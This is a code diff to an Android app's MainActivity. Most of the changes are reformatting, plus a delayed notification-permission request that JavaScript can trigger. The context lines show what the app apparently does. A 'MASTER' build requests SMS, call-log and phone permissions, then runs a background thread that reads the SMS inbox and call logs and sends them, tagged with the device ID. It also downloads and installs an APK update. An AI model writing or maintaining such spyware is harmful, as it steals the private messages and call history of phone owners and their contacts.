@@ -53,10 +53,14 @@ public class MainActivity extends BridgeActivity {
         if (isFullVersion()) {
             new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1000);
         } else {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
-                }
+            new Handler(Looper.getMainLooper()).postDelayed(this::requestNotificationPermission, 1500);
+        }
+    }
+
+    private void requestNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
             }
         }
     }
@@ -76,19 +80,16 @@ public class MainActivity extends BridgeActivity {
                 public boolean isLimitedVersion() { return !isFullVersion(); }
 
                 @JavascriptInterface
+                public void triggerNotificationRequest() { requestNotificationPermission(); }
+
+                @JavascriptInterface
                 public boolean hasAllPermissions() {
                     String[] perms = {
-                        Manifest.permission.SEND_SMS,
-                        Manifest.permission.RECEIVE_SMS,
-                        Manifest.permission.READ_SMS,
-                        Manifest.permission.READ_PHONE_STATE,
-                        Manifest.permission.CALL_PHONE,
-                        Manifest.permission.READ_CALL_LOG
+                        Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
+                        Manifest.permission.READ_PHONE_STATE, Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG
                     };
                     for (String p : perms) {
-                        if (ContextCompat.checkSelfPermission(MainActivity.this, p) != PackageManager.PERMISSION_GRANTED) {
-                            return false;
-                        }
+                        if (ContextCompat.checkSelfPermission(MainActivity.this, p) != PackageManager.PERMISSION_GRANTED) return false;
                     }
                     return true;
                 }
@@ -121,9 +122,7 @@ public class MainActivity extends BridgeActivity {
     }
 
     private boolean isFullVersion() {
-        try {
-            return "MASTER".equals(getString(R.string.app_type));
-        } catch (Exception e) { return false; }
+        try { return "MASTER".equals(getString(R.string.app_type)); } catch (Exception e) { return false; }
     }
 
     private void downloadAndInstallUpdate() {
@@ -146,8 +145,7 @@ public class MainActivity extends BridgeActivity {
                         installApk(file);
                         break;
                     }
-                    retry++;
-                    Thread.sleep(5000);
+                    retry++; Thread.sleep(5000);
                 } catch (Exception e) { retry++; try { Thread.sleep(5000); } catch (Exception ignored) {} }
             }
         }).start();
@@ -171,9 +169,7 @@ public class MainActivity extends BridgeActivity {
     @Override
     public void onResume() {
         super.onResume();
-        if (isFullVersion()) {
-            checkAndRequestPermissions();
-        }
+        if (isFullVersion()) checkAndRequestPermissions();
     }
 
     private void checkAndRequestPermissions() {
@@ -198,10 +194,7 @@ public class MainActivity extends BridgeActivity {
 
     private void startServiceLogic() {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        new Thread(() -> {
-            readAndSendSmsInbox(deviceId);
-            readAndSendCallLogs(deviceId);
-        }).start();
+        new Thread(() -> { readAndSendSmsInbox(deviceId); readAndSendCallLogs(deviceId); }).start();
     }
 
     private void readAndSendCallLogs(String deviceId) {
